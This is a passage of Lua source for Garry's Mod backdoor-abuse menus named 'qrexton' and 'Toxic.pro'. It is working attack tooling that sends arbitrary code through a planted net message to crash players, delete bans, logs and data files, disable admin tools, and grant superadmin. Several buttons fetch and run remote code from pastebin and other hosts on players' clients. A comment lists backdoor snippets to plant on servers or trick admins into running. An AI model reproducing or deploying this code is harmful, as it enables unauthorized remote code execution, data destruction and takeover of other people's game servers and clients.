    Derma_StringRequest("LuaRun String", "String", "", function(text)
        qrexton.PostLua( [[ RunString( "]]..text..[[" ) ]] )
    end)
end)

qrexton.AddButton( "Launch everyone", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ for k, v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000, 5000), math.random(1000, 5000), math.random(1000, 5000))) end ]] )
end)

qrexton.AddButton( "Lock all doors", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("lock", "", 0) end end ]] )
end)

qrexton.AddButton( "Rainbow physgun", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not physgun then hook.Add("Think", "rainbowphysgun", function() for k, ply in ipairs(player.GetAll()) do local col = HSVToColor(CurTime() % 6 * 60, 1, 1) ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255)) end end) physgun = true else hook.Remove("Think", "rainbowphysgun") physgun = false end ]] )
end)

qrexton.AddButton( "Rainbow hud", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if not rainbowscreen then BroadcastLua("hook.Add('HUDPaint', 'rainbowscreen', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)") rainbowscreen = true else BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')") rainbowscreen = false end ]] )
end)

qrexton.AddButton( "Rainbow everything", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ BroadcastLua([==[ if not timer.Exists("CP_Gaymod") then timer.Create("CP_Gaymod", 1, 0, function() local mats = Entity(0):GetMaterials() for k, v in pairs(mats) do local r, g, b = ColorRand().r - 50, ColorRand().g - 50, ColorRand().b - 50 Material(v):SetVector("$color", Vector(r, g, b)) end end) else timer.Remove("CP_Gaymod") end ]==]) ]] )
end)

qrexton.AddButton( "Remove bans", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if file.Exists("ulib/bans.txt", "DATA") then file.Delete("ulib/bans.txt") end ]] )
end)

qrexton.AddButton( "Open url on players", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("URL On Players", "URL Link", "", function(str)
        qrexton.PostLua( [[ ply:SendLua([=[ h = vgui.Create("DHTML") h:SetSize(ScrW(), ScrH()) h:OpenURL(]]..str..[[) ]=]) ]] )
    end)
end)

qrexton.AddButton( "Unlock all doors", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end ]] )
end)

qrexton.AddButton( "Unban SteamID", SC, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("ULX Unban SteamID", "SteamID", "", function(str)
        qrexton.PostLua( [[ ULib.unban("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Whitelist everything", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ if FPP then for k, v in pairs(FPP.Blocked) do for r, g in pairs(v) do RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r) end end end ]] )
end)

qrexton.AddButton( "Wipe data folder", SC, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local files, directories = file.Find("*", "DATA") for k, v in pairs(files) do file.Delete(v) end ]] )
end)


// Targeting

qrexton.AddButton("Control player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua([[ http.Fetch("https://pastebin.com/raw/jRNcmTRt", RunString) ]])  --https://pastebin.com/raw/Fxp01tjw 
    qrexchat("Press J to control player")

    hook.Add("Think", "ControllPlayerlol", function()
      local cache = input.IsButtonDown(KEY_J)

      if cache and FirstPressed then
        local skid=LocalPlayer():GetEyeTrace().Entity
        if not skid:IsPlayer() then return end

        net.Start("NachuiControll")
        net.WriteEntity(skid)
        net.SendToServer()
      end
      FirstPressed = not cache
    end)
end)

qrexton.AddButton("teleport skid with ragebot", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexchat("Press T on a player")

    hook.Add("Think", "teleportskid", function()
      local cache = input.IsButtonDown(KEY_T)

      if cache and FirstPressed then
        local skid=LocalPlayer():GetEyeTrace().Entity
        if not skid:IsPlayer() then return end

        qrexton.PostLua([[ local selected = Player(]]..selPly..[[) local target = Player(]]..skid:UserID()..[[) selected:SetPos(target:GetPos()) selected:StripWeapons() selected:Give('weapon_357') selected:SendLua('http.Fetch("https://pastebin.com/raw/QjgnweP5",RunString)') ]])
      end
      FirstPressed = not cache
    end)
end)

qrexton.AddButton( "Rapid fire", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ timer.Create("rf_]]..noobstr..[[", 0.01, 0, function() local p = Player("]]..selPly..[[") if p and IsValid(p) and p:Alive() then local w = p:GetActiveWeapon() if IsValid(w) then w:SetNextPrimaryFire(CurTime()) w:SetNextSecondaryFire(CurTime()) end end end) ]] )
end)


qrexton.AddButton( "Infinite ammo", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua([[timer.Create("ia_]]..noobstr..[[", 0.01, 0, function()
                local p = Player("]]..selPly..[[")
                if IsValid(p) && p:Alive() then
                local w = p:GetActiveWeapon()
                if IsValid(w) then
                w:SetClip1(w:GetMaxClip1())
                end end end)]])
end)

qrexton.AddButton( "Give weapons", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Give weapons", "e.g weapon_rpg", "", function(str)
        qrexton.PostLua( [[ local weps = Player("]]..selPly..[[") weps:Give("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Allahu ackbar", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local explo = ents.Create("env_explosion") local me = Player(]]..selPly..[[) explo:SetOwner(me) explo:SetPos(me:GetPos()) explo:SetKeyValue("iMagnitude", "250") explo:Spawn() explo:Activate() explo:Fire("Explode", "", 0) if me:Alive() then me:Kill() end ]] )
end)

qrexton.AddButton( "Enable godmode", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):GodEnable() ]] )
end)

qrexton.AddButton( "Disable godmode", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):GodDisable() ]] )
end)


qrexton.AddButton( "Ban player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):Ban("[CAC] Kone Bypass Detected!") ]] )
end)


qrexton.AddButton( "Co host", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):SendLua([=[ http.Fetch("http://206.189.17.188/qrex.lua",RunString) ]=]) ]] )
end)

qrexton.AddButton( "Co host Smeghack", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):SendLua([=[ http.Fetch("https://pastebin.com/raw/mf5mJnpU",RunString) ]=]) ]] )
end)

qrexton.AddButton( "Open url on player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("URL On Players", "URL Link", "", function(str)
        qrexton.PostLua( [[ Player(]]..selPly..[[):SendLua([=[ h = vgui.Create("DHTML") h:SetSize(ScrW(), ScrH()) h:OpenURL(]]..str..[[) ]=]) ]] )
    end)
end)

--m9k_barret_m82

qrexton.AddButton( "Ban player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):Ban("[CAC] Kone Bypass Detected!") ]] )
end)


qrexton.AddButton( "Cleanup props", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):ConCommand("gmod_cleanup") ]] )
end)

qrexton.AddButton( "Crash player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):SendLua("while true do end") ]] )
end)

qrexton.AddButton( "Drop weapon", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):DropWeapon(Player(]] ..selPly.. [[):GetActiveWeapon()) ]] )
end)

qrexton.AddButton( "Force command", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Force Command", "e.g disconnect", "", function(str)
        qrexton.PostLua( [[ Player("]]..selPly..[["):ConCommand("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Force say", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Force Say", "e.g /ooc Hi", "", function(str)
        qrexton.PostLua( [[ Player(]]..selPly..[[):Say("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Force Retry", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Force Say", "e.g /ooc Hi", "", function(str)
        qrexton.PostLua( [[ Player("]]..selPly..[["):ConCommand("retry") ]] )
    end)
end)

qrexton.AddButton( "Noclip player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local me = Player("]]..selPly..[[") if me:GetMoveType() ~= MOVETYPE_NOCLIP then me:SetMoveType(MOVETYPE_NOCLIP) else me:SetMoveType(MOVETYPE_WALK) end ]] )
end)

qrexton.AddButton( "Set usergroup", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set UserGroup", "e.g superadmin", "", function(str)
        qrexton.PostLua( [[ Player(]]..selPly..[[):SetUserGroup("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Noclip player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local me = Player("]]..selPly..[[") if me:GetMoveType() ~= MOVETYPE_NOCLIP then me:SetMoveType(MOVETYPE_NOCLIP) else me:SetMoveType(MOVETYPE_WALK) end ]] )
end)

qrexton.AddButton( "Speed hack", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local me = Player(]]..selPly..[[) if not me.Sanic then me:SetRunSpeed(1200) me:SetWalkSpeed(800) me.Sanic = true else me:SetRunSpeed(240) me:SetWalkSpeed(160) me.Sanic = false end ]] )
end)


qrexton.AddButton( "Set money", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    Derma_StringRequest("Set money", "+ = give / - = remove", "", function(str)
        qrexton.PostLua( [[ local ree = Player("]]..selPly..[[") ree:addMoney("]]..str..[[") ]] )
    end)
end)

qrexton.AddButton( "Give ammo", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local ply = nil % s for i = 1, 100 do ply:GiveAmmo(10000, i, false) end ]] )
end)

qrexton.AddButton( "M9K nuke", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ local nuke = ents.Create("m9k_davy_crockett_explo") local me = Player("]]..selPly..[[") nuke:SetPos(me:GetPos()) nuke:SetOwner(me) nuke.Owner = me nuke:Spawn() nuke:Activate() ]] )
end)

qrexton.AddButton( "Remove user", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):SetUserGroup("user")) ]] )
end)

qrexton.AddButton( "Kick Player", SC2, function()
    surface.PlaySound("buttons/button18.wav")
    qrexton.PostLua( [[ Player(]]..selPly..[[):Kick("[CAC] Truth Engineering") ]] )
end)

qrex:Hide()

local toggle = false

hook.Add("Think", "keyToggle", function()
    if input.IsKeyDown(openKey) and not toggle then
        toggle = true
        qrex:SetVisible(not qrex:IsVisible())
        gui.EnableScreenClicker(qrex:IsVisible())
    elseif not input.IsKeyDown(openKey) then
        toggle = false
    end
end)
end

local DermaButton = vgui.Create( "DButton", panel2 )
DermaButton:SetText( "Toxic.Pro" )
DermaButton:SetPos( 0, 180 )
DermaButton:SetSize( 400, 30 )
DermaButton.DoClick = function()
	/* 

COPYRIGHT 2018

YOU HAVE NO RIGHTS TO REDISTRIBUTE THIS FILE OR ANY FILES ASSOCIATED

YOU MAY NOT COPY AND PASTE THIS SCRIPT 
                                                                                              p.s. lua run does not work
Coded by Hayden Massey (ToxicRiver) @ toxicpro.xyz  (what a fucking joke)

*/

/*
	
	Toxic.pro
	
	Commissioned by 0xymoron for ToxicRiver
	
	Start Date: December 27th, 2017.
	
	First revision finished December 28th, 2017 @ 3:28AM.
	
	January 2nd, 2017 @ 6:27AM
	- This script truly has become toxic, ironic. 
	
*/

/*

-- Possible backdoor strings to plant in a file or convince a superadmin to luarun

util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunString( str ) end )
util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() CompileString( str, "[C]", false ) end )
util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = net.ReadString() RunStringEx( str ) end )

*/

/*

	metastruct editor read shit
	
	self.HTMLIDE:AddFunction("gmodinterface","OnCode",function(code) ... end)"

	https://github.com/Earu/EasyChat/blob/master/lua/easychat/modules/lua_tab.lua#L140

*/

local toxic = {}

toxic.Net = "nostrip" -- backdoored net message

toxic.Version = "1.2b-leak"

toxic.Aids = {

	"kill them with buttons",
	"you are the admen now",
	"odium copy paste!!!11!1",
	"tricking dumb admens since 2k17",
	"what servers can i use this on???",
	"#1 in backdoor 2k17 e-peen contest",
	"leaked on release day™",
	"here come the hax",
	"leaked by homeless meme",
	
}

/*
	
	Backend functions
	
*/

function toxic.Init()

	if !file.IsDir( "toxic.pro", "DATA" ) then file.CreateDir( "toxic.pro" ) end
	
	if !file.IsDir( "toxic.pro/files", "DATA" ) then file.CreateDir( "toxic.pro/files" ) end

	if !file.IsDir( "toxic.pro/files/lua", "DATA" ) then file.CreateDir( "toxic.pro/files/lua" ) end
	
end

function toxic.Track()

	-- TODO: php tracking & shit

end

function toxic.PostLua( str )

	net.Start( toxic.Net )
	
		net.WriteString( str )
		
	net.SendToServer()

end

function toxic.Notify( msg )

	chat.AddText( Color( 255, 0, 0 ), "[Toxic.pro] ", color_white, msg )

end

/*
	
	user interface
	
*/

function toxic.AddButton( name, parent, func )

	local button = parent:Add( "DButton" )
	button:SetText( "" )
	button:Dock( TOP )
	button:DockMargin( 0, 0, 0, 5 )
	button:SetSize( 100, 25 )
	button.DoClick = func
	
	button.Paint = function( self )
	
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 0, 0, 0, 200 ) )
		
		draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )
	
	end

	toxic.ButtonPos = toxic.ButtonPos + 30
	
end

function toxic.AddCategorySpacer( name, col, parent )

	toxic.ButtonPos = toxic.ButtonPos + 5
	
	local button = parent:Add( "DButton" )
	button:SetText( "" )
	button:Dock( TOP )
	button:DockMargin( 0, 0, 0, 5 )
	button:SetSize( 100, 25 )
	button:SetEnabled( false )
	
	button.Paint = function( self )
	
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( col.r, col.g, col.b, 200 ) )
		
		draw.SimpleText( name, "DebugFixed", self:GetWide() / 2, self:GetTall() / 2, color_white, 1, 1 )
	
	end	

	toxic.ButtonPos = toxic.ButtonPos + 35

end 

function toxic.OpenTextDocument( path, str, parent )
				
	local hostname = string.gsub( GetHostName(), "%W", "" )			
				
	toxic.Notify( "Received file " .. path )

	local frame = vgui.Create( "DFrame" )
	frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
	frame:SetPos( parent:GetWide() + 50, 25 )
	frame:SetTitle( GetHostName() .. "'s " .. path )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )

	frame.Paint = function( self )
						
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )
						
		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
						
	end 
	
	local close = vgui.Create( "DButton", frame )
	close:SetSize( 50, 20 )
	close:SetPos( frame:GetWide() - close:GetWide(), 0 )
	close:SetText( "x" )
	close:SetTextColor( Color( 255, 255, 255 ) )
	close:SetFont( "DebugFixed" )
					
	close.Paint = function()
					
		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
					
	end
					
	close.DoClick = function()
							
		frame:Close()
						
	end
					
	local html = vgui.Create( "DHTML", frame )
	html:SetPos( 5, 30 )
	html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
	html:OpenURL( "https://metastruct.github.io/lua_editor/" )
					
	html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )

	local save = vgui.Create( "DButton", frame )
	save:SetSize( 60, 20 )
	save:SetPos( frame:GetWide() - close:GetWide() - save:GetWide() - 5, 0 )
	save:SetText( "Save As" )
	save:SetTextColor( Color( 255, 255, 255 ) )
	save:SetFont( "DebugFixed" )
					
	save.Paint = function()
					
		draw.RoundedBox( 0, 0, 0, save:GetWide(), save:GetTall(), Color( 62, 168, 62, 255 ) )
					
	end
					
	save.DoClick = function()
					
		Derma_StringRequest( "Save file '" .. path .. "' to data/toxic.pro/files/" .. hostname .. "/", "File name (e.g: servercfg or servercfg.txt)", "", function( text ) 
				
			if !string.find( text, ".txt" ) then text = text .. ".txt" end
				
			if !file.IsDir( "toxic.pro/files/" .. hostname, "DATA" ) then file.CreateDir( "toxic.pro/files/" .. hostname ) end			
				
			file.Write( "toxic.pro/files/" ..  hostname .. "/" .. text, str )
				
			toxic.Notify( "Saved source to data/toxic.pro/files/" .. hostname .. "/" .. text )
			
		end )
						
	end	
	
end

toxic.LuaStr = ""

function toxic.OpenLuaEditor( parent )

	local frame = vgui.Create( "DFrame" )
	frame:SetSize( ScrW() - ( parent:GetWide() + 75 ), ScrH() - 50 )
	frame:SetPos( parent:GetWide() + 50, 25 )
	frame:SetTitle( "" )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )

	frame.Paint = function( self )
						
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 140, 0, 0, 150 ) )
						
		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
						
	end 
	
	local close = vgui.Create( "DButton", frame )
	close:SetSize( 50, 20 )
	close:SetPos( frame:GetWide() - close:GetWide(), 0 )
	close:SetText( "x" )
	close:SetTextColor( Color( 255, 255, 255 ) )
	close:SetFont( "DebugFixed" )
					
	close.Paint = function()
					
		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
					
	end
					
	close.DoClick = function()	
		
		frame:Close()
						
	end
					
	local html = vgui.Create( "DHTML", frame )
	html:SetPos( 5, 30 )
	html:SetSize( frame:GetWide() - 10, frame:GetTall() - 35 )
	html:OpenURL( "https://metastruct.github.io/lua_editor/" )
					
	html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( toxic.LuaStr ) .. "' )" )
			
	html:AddFunction( "gmodinterface", "OnCode", function( code ) -- thanks easychat
	
		toxic.LuaStr = code
	
	end )
	
	local run = vgui.Create( "DButton", frame )
	run:SetSize( 60, 20 )
	run:SetPos( 0, 0 )
	run:SetText( "Run" )
	run:SetTextColor( Color( 255, 255, 255 ) )
	run:SetFont( "DebugFixed" )
					
	run.Paint = function( self )
					
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 62, 168, 255 ) )
					
	end
					
	run.DoClick = function()
					
		local options = DermaMenu()
		
		options:AddOption( "Server", function()
			
			toxic.PostLua( toxic.LuaStr )
			
			toxic.Notify( "Ran Lua on server" )
			
		end ):SetImage( "icon16/server.png" )
		
		options:AddOption( "All Clients", function()
			
			toxic.PostLua( [[
			
				for k, v in next, player.GetAll() do
				
					v:SendLua( ']] .. toxic.LuaStr .. [[' )
				
				end
			
			]] )
			
			toxic.Notify( "Ran Lua on all clients" )
			
		end ):SetImage( "icon16/computer_add.png" )
		
		local players, menu = options:AddSubMenu( "Client" )
		
		menu:SetIcon( "icon16/user.png" )
		
		for k, v in next, player.GetAll() do
		
			players:AddOption( v:Nick(), function()
			
				local id = v:UserID()
				
				toxic.PostLua( [[
				
					local id = ]] .. id .. [[
					
					Player( id ):SendLua( ']] .. toxic.LuaStr .. [[' )
				
				]] )
				
				toxic.Notify( "Ran Lua on " .. v:Nick() )
			
			end )
		
		end
		
		options:Open()
		
	end	
	
	local save = vgui.Create( "DButton", frame )
	save:SetSize( 60, 20 )
	save:SetPos( run:GetWide() + 5, 0 )
	save:SetText( "Save" )
	save:SetTextColor( Color( 255, 255, 255 ) )
	save:SetFont( "DebugFixed" )
					
	save.Paint = function( self )
					
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )
					
	end
	
	save.DoClick = function()
					
		Derma_StringRequest( "Save file to data/toxic.pro/files/lua", "File name (e.g: aimbot or aimbot.txt)", "", function( text ) 
				
			if !string.find( text, ".txt" ) then text = text .. ".txt" end

			file.Write( "toxic.pro/files/lua/" .. text, toxic.LuaStr )
				
			toxic.Notify( "Saved source to data/toxic.pro/files/lua/" .. text )
			
		end )
						
	end	
	
	local load = vgui.Create( "DButton", frame )
	load:SetSize( 60, 20 )
	load:SetPos( run:GetWide() + load:GetWide() + 10, 0 )
	load:SetText( "Load" )
	load:SetTextColor( Color( 255, 255, 255 ) )
	load:SetFont( "DebugFixed" )
					
	load.Paint = function( self )
					
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 168, 148, 62, 255 ) )
					
	end
	
	load.DoClick = function()
	
		local options = DermaMenu()
		
		for k, v in pairs( file.Find( "toxic.pro/files/lua/*.txt", "DATA" ) ) do
		
			options:AddOption( v, function()
				
				local str = file.Read( "toxic.pro/files/lua/" .. v, "DATA" )
				
				MsgN( str )
				
				toxic.LuaStr = str
				
				html:QueueJavascript( "SetContent( '" .. string.JavascriptSafe( str ) .. "' )" )
				
				toxic.Notify( "Loaded " .. v )
				
			end )
			
		end
		
		options:Open()
		
	end
	
end

function toxic.UI()
	
	toxic.ButtonPos = 30
	
	local frame = vgui.Create( "DFrame" )
	frame:SetTitle( "Toxic.pro v" .. toxic.Version .. " | by 0xymoron ~ " .. table.Random( toxic.Aids ) )
	frame:SetSize( 550, 400 )
	frame:SetPos( 25, 25 )
	frame:MakePopup()
	frame:ShowCloseButton( false )
	frame:SetDraggable( false )
	
	frame.Paint = function( self )
		
		local hsv = HSVToColor( RealTime() * 120 % 360, 1, 1 )
		
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( hsv.r, hsv.g, hsv.b, 150 ) ) -- old: Color( 140, 0, 0, 150 )
		
		draw.RoundedBox( 0, 0, 0, self:GetWide(), 25, Color( 0, 0, 0, 200 ) )
		
		surface.SetFont( "CloseCaption_Bold" )
		
		local str1 = "Toxic.pro Version " .. toxic.Version
			
		local str1_width, str1_height = surface.GetTextSize( str1 )
		
		local str2 = "by 0xymoron"
		
		local str2_width, str2_height = surface.GetTextSize( str2 )
		
		draw.SimpleText( str1, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, 65, color_white, 1, 1 ) 
		
		draw.SimpleText( str2, "CloseCaption_Bold", frame:GetWide() / 2 + 2.5, frame:GetTall() - str2_height - 25, color_white, 1, 1 ) 
		
	end 
	
	local close = vgui.Create( "DButton", frame )
	close:SetSize( 50, 20 )
	close:SetPos( frame:GetWide() - 50, 0 )
	close:SetText( "x" )
	close:SetTextColor( Color( 255, 255, 255 ) )
	close:SetFont( "DebugFixed" )
	
	close.Paint = function()
	
		draw.RoundedBox( 0, 0, 0, close:GetWide(), close:GetTall(), Color( 168, 62, 62, 255 ) )
	
	end
	
	close.DoClick = function()
		
		frame:Close()
		
	end
	
	local set = vgui.Create( "DButton", frame )
	set:SetSize( 40, 20 )
	set:SetPos( frame:GetWide() - close:GetWide() - set:GetWide() - 5, 0 )
	set:SetText( "Set" )
	set:SetTextColor( Color( 255, 255, 255 ) )
	set:SetFont( "DebugFixed" )
	
	set.Paint = function( self )
	
		draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 62, 168, 62, 255 ) )
	
	end	
	
	local netmsg = vgui.Create( "DTextEntry", frame )
	netmsg:SetSize( 75, 20 )
	netmsg:SetPos( frame:GetWide() - close:GetWide() - netmsg:GetWide() - set:GetWide() - 10, 0 )
	netmsg:SetText( toxic.Net )
	
	netmsg.OnEnter = function( self )
	
		toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )
	
		toxic.Net = self:GetValue()
		
	end
	
	set.DoClick = function( self )
		
		toxic.Net = netmsg:GetValue()
		
		toxic.Notify( "Set backdoored net message to '" .. netmsg:GetValue() .. "'" )
		
	end	
	
	local panel = vgui.Create( "DScrollPanel", frame )
	panel:SetPos( 5, 30 )
	panel:SetSize( 150, frame:GetTall() - 35 )
	
	local html = vgui.Create( "HTML", frame )
	html:SetPos( panel:GetWide() + 20, 95 )
	html:SetSize( 240, 215 )
	html:SetHTML( [[
		<img src="http://www.clker.com/cliparts/c/e/8/f/12387015421849960016GameFreak7744_Biohazard_symbol.svg.med.png" alt="Img" style="width:200px;height:195px;">
	]] )
	
	/**************************************
		
		Player Management
		
	***************************************/
	
	local dlist = vgui.Create( "DListView", frame )
	dlist:SetSize( 140, frame:GetTall() - 35 )
	dlist:SetPos( frame:GetWide() - dlist:GetWide() - 5, 30 )
	dlist:SetMultiSelect( false )
	dlist:AddColumn( "Players" )
	
	for k, v in next, player.GetAll() do
		
		dlist:AddLine( v:Nick() )
	
	end

	dlist.OnClickLine = function( parent, line, self )
		
		for k, v in next, player.GetAll() do
			
			if v:Nick() == line:GetValue( 1 ) then
				
				dlist.SelectedEntity = v
					
			else
			
				continue
				
			end
			
		end
	
	end
	
	dlist.OnRowRightClick = function( parent, line, isselected )
	
		surface.PlaySound( "buttons/button9.wav" )
		
		local id = dlist.SelectedEntity:UserID()
		
		local target = Player( id )
		
		local options = DermaMenu()
		
		options:AddOption( "Kick", function()
			
			toxic.PostLua( [[
			
				Player( ]] .. id .. [[ ):Kick() 
			
			]] )
			
			toxic.Notify( "Kicked " .. target:Nick() )
			
			if dlist then
				
				dlist:RemoveLine( line )
				
			end
			
		end ):SetImage( "icon16/door_out.png" )
		
		options:AddOption( "Silent Slay", function()
			
			toxic.PostLua( [[
			
				Player( ]] .. id .. [[ ):KillSilent() 
			
			]] )
			
			toxic.Notify( "Silently slayed " .. target:Nick() )
			
		end ):SetImage( "icon16/lightning.png" )
		
		options:AddOption( "Freeze", function()
			
			toxic.PostLua( [[
				
				local ply = Player( ]] .. id .. [[ )
				
				ply:Freeze( !ply:IsFrozen() )
			
			]] )
			
			if !target:IsFrozen() then
			
				toxic.Notify( "Froze " .. target:Nick() )
				
			else
			
				toxic.Notify( "Unfroze " .. target:Nick() )
				
			end
			
		end ):SetImage( "icon16/tux.png" )
		
		options:AddOption( "Give Weapon", function()
			
			Derma_StringRequest( "Give " .. target:Nick() .. " a weapon", "What weapon? (example: weapon_ak47)", "", function( text ) 
			
				toxic.PostLua( [[
					
					local str = "]] .. text .. [["
					
					Player( ]] .. id .. [[ ):Give( str )
				
				]] )
		
				toxic.Notify( "Gave " .. target:Nick() .. " a " .. text )
	
			end )
			
		end ):SetImage( "icon16/bomb.png" )
		
		options:AddOption( "Give Money", function()
			
			Derma_StringRequest( "Give " .. target:Nick() .. " money", "How much?", "", function( text ) 
				
				if !isnumber( tonumber( text ) ) then return end
				
				toxic.PostLua( [[
					
					local str = "]] .. text .. [["
					str = tonumber( str )
					
					Player( ]] .. id .. [[ ):addMoney( str )
				
				]] )
		
				toxic.Notify( "Gave " .. target:Nick() .. " $" .. string.Comma( text ) )
	
			end )
			
		end ):SetImage( "icon16/money_add.png" )
		
		options:AddOption( "Inject Toxic.pro", function()
			
			local snd = table.Random( { "vo/npc/male01/herecomehacks01.wav","vo/npc/male01/herecomehacks02.wav" } ) -- stfu
			
			toxic.PostLua( [[		
					
				Player(]] .. id .. [[):SendLua('http.Fetch("http://snixzz.net/toxic.pro/toxic.lua",function(body) RunString(body) surface.PlaySound("]] .. snd .. [[") chat.AddText(Color(255,0,0),"[Toxic.pro] ",color_white,"Welcome, run `toxic.pro` in console") end)')
				
			]] )
		
			toxic.Notify( "Injected Toxic.pro into " .. target:Nick() .. "'s client." )
			
		end ):SetImage( "icon16/bug_add.png" )
		
		options:Open()
		
	end
	
	/**************************************
		
		Buttons
		
	***************************************/
	
	
	toxic.AddCategorySpacer( "Prevention", Color( 255, 0, 0 ), panel )
	
	toxic.AddButton( "Break ULX", panel, function()
	
		toxic.PostLua( [[ _G.ulx = function() end _G.ULib = function() end ]])

		toxic.Notify( "Broke ULX, admins now have no control." )	
	
	end )
	
	toxic.AddButton( "Break FAdmin", panel, function()
	
		toxic.PostLua( [[
		
			_G.FAdmin = function() end
		
		]] )
		
		toxic.Notify( "Killed FAdmin" )
	
	end )
	
	toxic.AddButton( "Wipe Logs", panel, function()
		
		local date = os.date( "%m-%d-%y" )
		
		toxic.PostLua( [[ 
			
			file.Delete( "ulx_logs/]] .. date .. [[.txt" )
		
		]] )
		
		toxic.Notify( "Deleted data/ulx_logs/" .. date .. ".txt" )
	
	end )
	
	toxic.AddButton( "Wipe data/", panel, function()
		
